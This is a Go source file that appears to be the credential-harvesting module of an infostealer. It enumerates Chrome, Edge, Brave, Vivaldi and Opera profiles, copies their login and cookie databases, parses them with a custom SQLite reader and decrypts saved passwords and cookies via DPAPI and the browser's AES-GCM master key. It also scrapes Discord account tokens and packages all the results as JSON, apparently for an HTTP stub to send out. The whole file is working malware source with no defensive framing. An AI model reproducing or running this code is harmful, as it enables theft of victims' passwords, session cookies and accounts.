package main

// Browser credential / cookie / Discord-token collection for the HTTP stub.
//
// Chromium keeps logins and cookies in SQLite files. There is no cgo here, so
// the reader below walks the b-tree pages directly instead of linking a driver.
// Secrets are DPAPI blobs (pre-v80) or AES-256-GCM blobs whose key lives in the
// browser's "Local State" file, itself DPAPI-wrapped.

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// ── DPAPI ────────────────────────────────────────────────────────────────────

type dataBlob struct {
	cbData uint32
	pbData *byte
}

var (
	crypt32            = syscall.NewLazyDLL("crypt32.dll")
	pCryptUnprotect    = crypt32.NewProc("CryptUnprotectData")
)

func dpapiUnprotect(in []byte) ([]byte, error) {
	if len(in) == 0 {
		return nil, fmt.Errorf("empty blob")
	}
	var din, dout dataBlob
	din.cbData = uint32(len(in))
	din.pbData = &in[0]
	var descr uintptr
	r, _, err := pCryptUnprotect.Call(
		uintptr(unsafe.Pointer(&din)),
		0,
		0,
		0,
		0,
		0,
		uintptr(unsafe.Pointer(&dout)),
	)
	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData: %v", err)
	}
	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(dout.pbData)))
	_ = descr
	out := make([]byte, dout.cbData)
	copy(out, unsafe.Slice(dout.pbData, dout.cbData))
	return out, nil
}

// ── minimal read-only SQLite ─────────────────────────────────────────────────

type sqliteFile struct {
	buf      []byte
	pageSize int
	usable   int
}

func openSQLite(path string) (*sqliteFile, error) {
	// The browser holds the file open; copy it out first.
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("umbra-%d.db", nowNano()))
	if err := copyFile(path, tmp); err != nil {
		return nil, err
	}
	defer os.Remove(tmp)
	buf, err := os.ReadFile(tmp)
	if err != nil {
		return nil, err
	}
	if len(buf) < 100 || string(buf[:16]) != "SQLite format 3\x00" {
		return nil, fmt.Errorf("not sqlite")
	}
	ps := int(binary.BigEndian.Uint16(buf[16:18]))
	if ps == 1 {
		ps = 65536
	}
	if ps < 512 || ps > 65536 {
		return nil, fmt.Errorf("bad page size %d", ps)
	}
	f := &sqliteFile{buf: buf, pageSize: ps, usable: ps - int(buf[20])}
	if f.usable < 480 {
		f.usable = ps - 12
	}
	return f, nil
}

func (f *sqliteFile) page(n int) []byte {
	off := (n - 1) * f.pageSize
	if off < 0 || off+f.pageSize > len(f.buf) {
		return nil
	}
	return f.buf[off : off+f.pageSize]
}

func varint(b []byte) (int64, int) {
	var v int64
	for i := 0; i < 9 && i < len(b); i++ {
		v = (v << 7) | int64(b[i]&0x7f)
		if b[i]&0x80 == 0 {
			return v, i + 1
		}
	}
	return v, 0
}

// walkTable returns every row of the table rooted at page n as raw records.
func (f *sqliteFile) walkTable(n int) [][]byte {
	var out [][]byte
	seen := map[int]bool{}
	var rec func(int)
	rec = func(pg int) {
		if pg <= 0 || seen[pg] {
			return
		}
		seen[pg] = true
		p := f.page(pg)
		if p == nil {
			return
		}
		switch p[0] {
		case 0x05: // interior table page
			cells := int(binary.BigEndian.Uint16(p[3:5]))
			for i := 0; i < cells; i++ {
				off := int(binary.BigEndian.Uint16(p[12+i*2 : 14+i*2]))
				if off+4 > len(p) {
					continue
				}
				child := int(binary.BigEndian.Uint32(p[off : off+4]))
				rec(child)
			}
			right := int(binary.BigEndian.Uint32(p[8:12]))
			rec(right)
		case 0x0d: // leaf table page
			cells := int(binary.BigEndian.Uint16(p[3:5]))
			for i := 0; i < cells; i++ {
				off := int(binary.BigEndian.Uint16(p[12+i*2 : 14+i*2]))
				if off >= len(p) {
					continue
				}
				payload, _ := f.cellPayload(p, off)
				if payload != nil {
					out = append(out, payload)
				}
			}
		}
	}
	rec(n)
	return out
}

// cellPayload reads one leaf cell, following overflow pages when the record
// spills past the page.
func (f *sqliteFile) cellPayload(p []byte, off int) ([]byte, int) {
	plen, n1 := varint(p[off:])
	if n1 == 0 {
		return nil, 0
	}
	_, n2 := varint(p[off+n1:])
	body := off + n1 + n2
	maxLocal := f.usable - 35
	if int(plen) <= maxLocal {
		if body+int(plen) > len(p) {
			return nil, 0
		}
		return p[body : body+int(plen)], 1
	}
	local := maxLocal
	if local > len(p)-body {
		local = len(p) - body
	}
	out := append([]byte{}, p[body:body+local]...)
	next := int(binary.BigEndian.Uint32(p[len(p)-4:]))
	for next != 0 && len(out) < int(plen) {
		np := f.page(next)
		if np == nil {
			break
		}
		next = int(binary.BigEndian.Uint32(np[len(np)-4:]))
		take := int(plen) - len(out)
		if take > len(np)-4 {
			take = len(np) - 4
		}
		if take <= 0 {
			break
		}
		out = append(out, np[4:4+take]...)
	}
	return out, 1
}

// decodeRecord splits a record into its column values as strings.
func decodeRecord(rec []byte) []string {
	hlen, n := varint(rec)
	if n == 0 || int(hlen) > len(rec) {
		return nil
	}
	types := []int64{}
	for i := n; i < int(hlen); {
		t, m := varint(rec[i:])
		if m == 0 {
			break
		}
		types = append(types, t)
		i += m
	}
	body := int(hlen)
	out := make([]string, 0, len(types))
	for _, t := range types {
		switch {
		case t == 0:
			out = append(out, "")
		case t >= 1 && t <= 6:
			sz := []int{0, 1, 2, 3, 4, 6, 8}[t]
			if body+sz > len(rec) {
				out = append(out, "")
				break
			}
			var v int64
			for i := 0; i < sz; i++ {
				v = (v << 8) | int64(rec[body+i])
			}
			out = append(out, fmt.Sprint(v))
			body += sz
		case t == 7:
			if body+8 > len(rec) {
				out = append(out, "")
				break
			}
			out = append(out, fmt.Sprint(binary.BigEndian.Uint64(rec[body:body+8])))
			body += 8
		case t == 8:
			out = append(out, "0")
		case t == 9:
			out = append(out, "1")
		case t >= 12 && t%2 == 0:
			l := int((t - 12) / 2)
			if body+l > len(rec) {
				out = append(out, "")
				break
			}
			out = append(out, string(rec[body:body+l]))
			body += l
		case t >= 13:
			l := int((t - 13) / 2)
			if body+l > len(rec) {
				out = append(out, "")
				break
			}
			out = append(out, string(rec[body:body+l]))
			body += l
		default:
			out = append(out, "")
		}
	}
	return out
}

// tableRows finds a table by name via sqlite_master and returns its rows.
func (f *sqliteFile) tableRows(name string) [][]string {
	root := 0
	for _, rec := range f.walkTable(1) {
		cols := decodeRecord(rec)
		if len(cols) >= 4 && cols[0] == "table" && cols[1] == name {
			root = atoiSafe(cols[3])
			break
		}
	}
	if root == 0 {
		return nil
	}
	var rows [][]string
	for _, rec := range f.walkTable(root) {
		rows = append(rows, decodeRecord(rec))
	}
	return rows
}

// ── Chromium secret decryption ───────────────────────────────────────────────

func chromeMasterKey(userDataDir string) []byte {
	raw, err := os.ReadFile(filepath.Join(userDataDir, "Local State"))
	if err != nil {
		return nil
	}
	var st struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if json.Unmarshal(raw, &st) != nil || st.OSCrypt.EncryptedKey == "" {
		return nil
	}
	blob, err := base64.StdEncoding.DecodeString(st.OSCrypt.EncryptedKey)
	if err != nil || len(blob) < 5 {
		return nil
	}
	key, err := dpapiUnprotect(blob[5:]) // strip "DPAPI"
	if err != nil {
		return nil
	}
	return key
}

func decryptChromium(key, blob []byte) string {
	if len(blob) == 0 {
		return ""
	}
	if len(blob) > 3 && string(blob[:3]) == "v10" || len(blob) > 3 && string(blob[:3]) == "v11" {
		if len(key) == 32 && len(blob) > 15 {
			block, err := aes.NewCipher(key)
			if err == nil {
				gcm, err := cipher.NewGCM(block)
				if err == nil && len(blob) >= 12+gcm.NonceSize() {
					nonce := blob[3 : 3+gcm.NonceSize()]
					ct := blob[3+gcm.NonceSize():]
					if pt, err := gcm.Open(nil, nonce, ct, nil); err == nil {
						return string(pt)
					}
				}
			}
		}
		return ""
	}
	if pt, err := dpapiUnprotect(blob); err == nil {
		return string(pt)
	}
	return ""
}

// ── collection ───────────────────────────────────────────────────────────────

type browserProfile struct {
	name string
	dir  string // <User Data>
}

func chromiumProfiles() []browserProfile {
	la := os.Getenv("LOCALAPPDATA")
	ad := os.Getenv("APPDATA")
	var out []browserProfile
	add := func(name, base string) {
		if base == "" {
			return
		}
		if st, err := os.Stat(base); err == nil && st.IsDir() {
			out = append(out, browserProfile{name: name, dir: base})
		}
	}
	add("chrome", filepath.Join(la, "Google", "Chrome", "User Data"))
	add("edge", filepath.Join(la, "Microsoft", "Edge", "User Data"))
	add("brave", filepath.Join(la, "BraveSoftware", "Brave-Browser", "User Data"))
	add("vivaldi", filepath.Join(la, "Vivaldi", "User Data"))
	add("chromium", filepath.Join(la, "Chromium", "User Data"))
	add("opera", filepath.Join(ad, "Opera Software", "Opera Stable"))
	add("operagx", filepath.Join(ad, "Opera Software", "Opera GX Stable"))
	return out
}

func profileDirs(userData string) []string {
	var dirs []string
	entries, err := os.ReadDir(userData)
	if err != nil {
		return dirs
	}
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		n := e.Name()
		if n == "Default" || strings.HasPrefix(n, "Profile ") {
			dirs = append(dirs, filepath.Join(userData, n))
		}
	}
	if len(dirs) == 0 {
		dirs = append(dirs, userData)
	}
	return dirs
}

type credRow struct {
	Browser int    `json:"browser"`
	URL     string `json:"url"`
	User    string `json:"username"`
	Pass    string `json:"password"`
	Created string `json:"created"`
}

func collectCredentials() string {
	var out []credRow
	for bi, bp := range chromiumProfiles() {
		key := chromeMasterKey(bp.dir)
		for _, pd := range profileDirs(bp.dir) {
			path := filepath.Join(pd, "Login Data")
			if _, err := os.Stat(path); err != nil {
				continue
			}
			f, err := openSQLite(path)
			if err != nil {
				continue
			}
			for _, row := range f.tableRows("logins") {
				if len(row) < 4 {
					continue
				}
				pass := decryptChromium(key, []byte(row[3]))
				if row[1] == "" && pass == "" {
					continue
				}
				out = append(out, credRow{Browser: bi, URL: row[1], User: row[2], Pass: pass, Created: ""})
			}
		}
	}
	b, _ := json.Marshal(out)
	return string(b)
}

type cookieRow struct {
	Browser    int    `json:"browser"`
	Host       string `json:"host"`
	Name       string `json:"name"`
	Value      string `json:"value"`
	Path       string `json:"path"`
	Expires    int64  `json:"expires_utc"`
	Secure     int    `json:"is_secure"`
	HTTPOnly   int    `json:"is_httponly"`
	Persistent int    `json:"is_persistent"`
	EncVersion int    `json:"enc_version"`
}

func collectCookies() string {
	var out []cookieRow
	for bi, bp := range chromiumProfiles() {
		key := chromeMasterKey(bp.dir)
		for _, pd := range profileDirs(bp.dir) {
			path := filepath.Join(pd, "Network", "Cookies")
			if _, err := os.Stat(path); err != nil {
				path = filepath.Join(pd, "Cookies")
				if _, err := os.Stat(path); err != nil {
					continue
				}
			}
			f, err := openSQLite(path)
			if err != nil {
				continue
			}
			for _, row := range f.tableRows("cookies") {
				if len(row) < 12 {
					continue
				}
				val := row[3]
				if val == "" {
					val = decryptChromium(key, []byte(row[4]))
				}
				out = append(out, cookieRow{
					Browser: bi, Host: row[1], Name: row[2], Value: val, Path: row[5],
					Expires: atoi64Safe(row[6]), Secure: atoiSafe(row[8]), HTTPOnly: atoiSafe(row[9]),
					Persistent: atoiSafe(row[10]), EncVersion: atoiSafe(row[11]),
				})
			}
		}
	}
	b, _ := json.Marshal(out)
	return string(b)
}

type discordRow struct {
	Token         string `json:"token"`
	Email         string `json:"email"`
	UserID        string `json:"user_id"`
	Username      string `json:"username"`
	Discriminator string `json:"discriminator"`
	Avatar        string `json:"avatar"`
	MFA           bool   `json:"mfa_enabled"`
	Source        string `json:"source"`
}

var tokenRe = regexp.MustCompile(`[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}`)

func collectDiscord() string {
	ad := os.Getenv("APPDATA")
	roots := []string{
		filepath.Join(ad, "discord", "Local Storage", "leveldb"),
		filepath.Join(ad, "discordcanary", "Local Storage", "leveldb"),
		filepath.Join(ad, "discordptb", "Local Storage", "leveldb"),
		filepath.Join(ad, "Lightcord", "Local Storage", "leveldb"),
	}
	seen := map[string]bool{}
	var out []discordRow
	for _, root := range roots {
		entries, err := os.ReadDir(root)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() {
				continue
			}
			n := e.Name()
			if !strings.HasSuffix(n, ".ldb") && !strings.HasSuffix(n, ".log") {
				continue
			}
			raw, err := os.ReadFile(filepath.Join(root, n))
			if err != nil {
				continue
			}
			for _, m := range tokenRe.FindAll(raw, -1) {
				tok := string(m)
				if seen[tok] {
					continue
				}
				seen[tok] = true
				out = append(out, discordRow{Token: tok, Source: filepath.Base(filepath.Dir(filepath.Dir(root)))})
			}
		}
	}
	if out == nil {
		out = []discordRow{}
	}
	b, _ := json.Marshal(out)
	return string(b)
}

// ── small helpers ────────────────────────────────────────────────────────────

func nowNano() int64 { return time.Now().UnixNano() }

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = out.ReadFrom(in)
	return err
}

func atoiSafe(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func atoi64Safe(s string) int64 {
	var n int64
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int64(c-'0')
	}
	return n
}

var _ = bytes.MinRead
